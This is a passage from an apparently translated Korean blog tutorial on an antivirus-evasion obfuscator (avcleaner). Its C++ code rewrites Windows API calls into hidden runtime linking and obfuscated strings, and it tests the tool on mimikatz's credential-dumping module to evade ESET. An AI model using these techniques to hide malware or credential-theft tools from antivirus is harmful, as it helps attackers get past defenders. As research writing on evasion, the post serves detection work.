id="&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xB300;&#xCCB4;"><a href="#&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xB300;&#xCCB4;" class="headerlink" title="&#xD568;&#xC218; &#xD638;&#xCD9C; &#xB300;&#xCCB4;"></a>&#xD568;&#xC218; &#xD638;&#xCD9C; &#xB300;&#xCCB4;</h3><p>&#xC774;&#xAC83;&#xC740; &#xAC00;&#xC7A5; &#xC0AC;&#xC18C;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xB2E4;. &#xBAA9;&#xD45C;&#xB294; AST&#xC758; <code>MessageBoxA</code>&#xB97C; &#xBB34;&#xC791;&#xC704; &#xC2DD;&#xBCC4;&#xC790;&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBB34;&#xC791;&#xC704; &#xBCC0;&#xC218; &#xCD08;&#xAE30;&#xD654;&#xB294; &#xB2E4;&#xC74C; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB41C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>{    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);}</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API&#xB294; &#xD568;&#xC218; &#xC2DD;&#xBCC4;&#xC790;&#xC758; &#xC774;&#xB984;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);}</code></pre><h3 id="LoadLibrary-GetProcAddress-&#xC0BD;&#xC785;"><a href="#LoadLibrary-GetProcAddress-&#xC0BD;&#xC785;" class="headerlink" title="LoadLibrary/GetProcAddress &#xC0BD;&#xC785;"></a>LoadLibrary/GetProcAddress &#xC0BD;&#xC785;</h3><p>&#xC6B0;&#xB9AC;&#xAC00; &#xCD94;&#xAC00;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; API&#xC5D0; Run-time dynamic linking&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;:</p><ul><li>translation unit&#xC758; &#xC0C1;&#xB2E8; &#xD639;&#xC740; enclosing &#xD568;&#xC218; &#xC548;&#xC5D0; API &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xB77C;. &#xC27D;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC6B0;&#xB9AC;&#xB294; &#xD6C4;&#xC790;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC77C;&#xD55C; &#xD568;&#xC218;&#xC5D0;&#xC11C; API&#xB97C; &#xC5EC;&#xB7EC; &#xBC88; &#xD638;&#xCD9C;&#xD560; &#xACBD;&#xC6B0; &#xC774;&#xBBF8; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xB2E4;.</li><li><p>&#xC544;&#xB798; &#xB77C;&#xC778;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xB77C;</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> &#xD638;&#xCD9C;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xB77C;</p></li></ul><p>&#xBB3C;&#xB860; &#xC774; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xBA74;&#xC11C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xC704;&#xD574; &#xAC01; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC2A4;&#xD0DD; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC791;&#xC131;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xC77D;&#xAE30; &#xC9C0;&#xB8E8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC9C0;&#xB9CC; &#xBCF5;&#xC7A1;&#xD558;&#xC9C4; &#xC54A;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>{    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) {        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    }    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));}</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>&#xC804;&#xBD80; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798; &#xD14C;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>obfuscator &#xC2E4;&#xD589;!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>&#xACB0;&#xACFC; &#xD655;&#xC778;!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = {<span class="hljs-string">&apos;\x53&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x6d&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-string">&apos;\x68&apos;</span>,<span class="hljs-string">&apos;\x69&apos;</span>,<span class="hljs-string">&apos;\x6e&apos;</span>,<span class="hljs-string">&apos;\x67&apos;</span>,<span class="hljs-number">0</span>};    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = {<span class="hljs-string">&apos;\x41&apos;</span>,<span class="hljs-string">&apos;\x6e&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-string">&apos;\x68&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x72&apos;</span>,<span class="hljs-string">&apos;\x20&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-number">0</span>};    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = {<span class="hljs-string">&apos;\x41&apos;</span>,<span class="hljs-string">&apos;\x6e&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-string">&apos;\x68&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x72&apos;</span>,<span class="hljs-string">&apos;\x20&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x6d&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x74&apos;</span>,<span class="hljs-string">&apos;\x68&apos;</span>,<span class="hljs-string">&apos;\x69&apos;</span>,<span class="hljs-string">&apos;\x6e&apos;</span>,<span class="hljs-string">&apos;\x67&apos;</span>,<span class="hljs-number">0</span>};    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = {<span class="hljs-string">&apos;\x55&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x72&apos;</span>,<span class="hljs-string">&apos;\x33&apos;</span>,<span class="hljs-string">&apos;\x32&apos;</span>,<span class="hljs-string">&apos;\x2e&apos;</span>,<span class="hljs-string">&apos;\x64&apos;</span>,<span class="hljs-string">&apos;\x6c&apos;</span>,<span class="hljs-string">&apos;\x6c&apos;</span>,<span class="hljs-number">0</span>};    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = {<span class="hljs-string">&apos;\x4d&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x61&apos;</span>,<span class="hljs-string">&apos;\x67&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x42&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x78&apos;</span>,<span class="hljs-string">&apos;\x41&apos;</span>,<span class="hljs-number">0</span>};    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = {<span class="hljs-string">&apos;\x55&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x72&apos;</span>,<span class="hljs-string">&apos;\x33&apos;</span>,<span class="hljs-string">&apos;\x32&apos;</span>,<span class="hljs-string">&apos;\x2e&apos;</span>,<span class="hljs-string">&apos;\x64&apos;</span>,<span class="hljs-string">&apos;\x6c&apos;</span>,<span class="hljs-string">&apos;\x6c&apos;</span>,<span class="hljs-number">0</span>};    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = {<span class="hljs-string">&apos;\x4d&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x73&apos;</span>,<span class="hljs-string">&apos;\x61&apos;</span>,<span class="hljs-string">&apos;\x67&apos;</span>,<span class="hljs-string">&apos;\x65&apos;</span>,<span class="hljs-string">&apos;\x42&apos;</span>,<span class="hljs-string">&apos;\x6f&apos;</span>,<span class="hljs-string">&apos;\x78&apos;</span>,<span class="hljs-string">&apos;\x41&apos;</span>,<span class="hljs-number">0</span>};    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654;&#xC640; API &#xB09C;&#xB3C5;&#xD654; &#xD328;&#xC2A4;&#xC758; &#xC870;&#xD569;&#xC740; &#xC0C1;&#xB2F9;&#xD788; &#xAC15;&#xB825;&#xD558;&#xB2E4;. <code>Test</code> &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xC791;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xBB34;&#xC2DC;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xACB0;&#xC815;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB0A8;&#xC544;&#xC788;&#xB2E4;. &#xADF8; &#xD6C4; &#xB09C;&#xB3C5;&#xD654; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB294; &#xBE4C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>&#xC708;&#xB3C4;&#xC6B0;10 &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8; &#xACB0;&#xACFC; &#xC6D0;&#xB798; &#xAE30;&#xB2A5;&#xC774; &#xACC4;&#xC18D; &#xC791;&#xB3D9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;. &#xB354; &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; &#xB09C;&#xB3C5;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; <code>MessageBox</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC5C6;&#xB2E4;.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>&#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; ESET Nod32 &#xAD00;&#xB828;&#xD574;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; <code>samlib.dll</code>&#xACFC; &#xAD00;&#xB828;&#xB41C; API imports &#xC911; &#xD2B9;&#xD788; &#xC544;&#xB798;&#xC5D0; &#xC788;&#xB294; API&#xB4E4;&#xC744; &#xC228;&#xAE30;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC740; AV &#xC5D4;&#xC9C4; &#xC5B4;&#xB514;&#xC5D0;&#xC11C;&#xB3C4; &#xBE14;&#xB799;&#xB9AC;&#xC2A4;&#xD2B8;&#xC5D0; &#xC788;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xB0B4;&#xBD80; &#xD0D0;&#xC9C0; &#xC2E0;&#xB8B0; &#xC810;&#xC218;&#xB97C; &#xB192;&#xC778;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD568;&#xC218;&#xC5D0; <code>ApiCallConsumer</code>&#xB97C; &#xB4F1;&#xB85D;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; &#xC774;&#xB984;&#xACFC; &#xD568;&#xC218; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC774; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = {    {<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>},    {<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>},    {<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>},    ...}</code></pre><p>&#xADF8; &#xD6C4; &#xC774;&#xB7EC;&#xD55C; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xBC18;&#xBCF5;&#xD558;&#xACE0; &#xAC01; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; <code>main.cpp</code>&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib){    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);}</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>std::make_unique</code>&#xB294; &#xC774; &#xBC18;&#xBCF5;&#xBB38;&#xC5D0;&#xC11C; &#xD799;&#xC5D0; &#xC788;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654;&#xD560; &#xC218; &#xC788;&#xAE30;&#xC5D0; &#xC911;&#xC694;&#xD558;&#xACE0; &#xB098;&#xC911;&#xC5D0; &#xC774;&#xB7EC;&#xD55C; &#xAC1D;&#xCCB4;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xAC83;&#xC740; &#xB354; &#xC774;&#xC0C1; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xB54C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD574;&#xC81C;&#xB420; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; mimikatz, &#xD2B9;&#xD788; <code>kuhl_m_lsadump.c</code>&#xB85C; &#xB09C;&#xB3C5;&#xD654;&#xB97C; &#xD14C;&#xC2A4;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>&#xC774;&#xAC83;&#xC740; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xACB0;&#xACFC;&#xB97C; &#xB9CC;&#xB4E0;&#xB2E4;.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png" alt></p><p><code>samlib.dll</code>&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; API&#xB97C; &#xC704;&#xD55C; Run-time dynamic linking</p><p>&#xC2E4;&#xC81C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xB2E4;.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png" alt></p><p><code>samlib.dll</code>&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC628; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB4E4;&#xC740; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xB2E4;.</p><p><code>PRINT_ERROR</code> &#xB9E4;&#xD06C;&#xB85C; &#xB0B4;&#xBD80;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xC740; <code>do{}while(0)</code>&#xC744; &#xD1B5;&#xD574; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB09C;&#xB3C5;&#xD654; &#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. obfuscator&#xC758; &#xBC84;&#xADF8;&#xB97C; &#xCC3E;&#xB294;&#xB370; <code>mimikatz</code>&#xBCF4;&#xB2E4; &#xC88B;&#xC740; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xCC3E;&#xAE30; &#xBABB;&#xD588;&#xB2E4;.</p><h2 id="&#xAC1C;&#xC120;&#xC0AC;&#xD56D;"><a href="#&#xAC1C;&#xC120;&#xC0AC;&#xD56D;" class="headerlink" title="&#xAC1C;&#xC120;&#xC0AC;&#xD56D;"></a>&#xAC1C;&#xC120;&#xC0AC;&#xD56D;</h2><p>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xC5EC;&#xB7EC;&#xBD84;&#xC744; &#xC704;&#xD574; &#xB0A8;&#xACA8;&#xC9C4; 